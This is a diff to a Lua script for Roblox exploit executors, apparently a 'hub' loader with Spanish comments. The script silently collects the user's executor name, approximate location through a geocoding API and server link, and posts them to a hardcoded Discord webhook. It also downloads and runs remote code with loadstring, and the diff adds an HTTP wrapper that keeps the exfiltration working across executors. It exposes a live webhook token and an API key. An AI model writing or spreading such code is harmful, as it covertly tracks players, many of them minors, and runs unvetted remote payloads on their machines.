@@ -4,7 +4,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
--- 🔒 ANTI DUPLICADO GLOBAL (SCRIPT COMPLETO)
+-- 🔒 ANTI DUPLICADO GLOBAL
 if getgenv().Revul_Executed then return end
 getgenv().Revul_Executed = true
 
@@ -30,6 +30,14 @@ end
 
 -- 📡 WEBHOOK
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"
+
+-- 🧠 HTTP wrapper compatible
+local http = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+
+if not http then
+    warn("❌ Executor no soporta HTTP requests")
+    return
+end
 
 -- 🖥️ Executor
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
@@ -57,8 +65,8 @@ pcall(function()
     end
 end)
 
--- 🏘️ COLONIA APROX
-local colony = "Unknown"
+-- 🏘️ COLONIA
+local colony = "Approx area"
 pcall(function()
     local apiKey = "2a9d5a2f93e242bca7482f597032d83f"
     local url = "https://api.opencagedata.com/geocode/v1/json?q=" ..
@@ -125,13 +133,12 @@ local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 local serverLink = "https://www.roblox.com/games/" ..
 game.PlaceId .. "?gameInstanceId=" .. game.JobId
 
--- 🚀 EJECUTAR HUB PRIMERO
+-- 🚀 Ejecutar hub primero
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5f43c5a7d6b0a78eaf931dadba1c1d1f.lua"))()
 
--- ⏱️ Espera carga
 task.wait(3)
 
--- 🔒 ANTI SPAM WEBHOOK
+-- 🔒 Anti spam webhook
 if getgenv().Revul_WebhookSent then return end
 getgenv().Revul_WebhookSent = true
 
@@ -171,14 +178,13 @@ local data = {
 
             {["name"] = "🔐 Access Type", ["value"] = accessType, ["inline"] = true},
             {["name"] = "⏱️ Timestamp", ["value"] = timeStamp, ["inline"] = false},
-
         }
     }}
 }
 
--- 📤 ENVIAR A DISCORD
+-- 📤 Enviar webhook
 pcall(function()
-    request({
+    http({
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = {
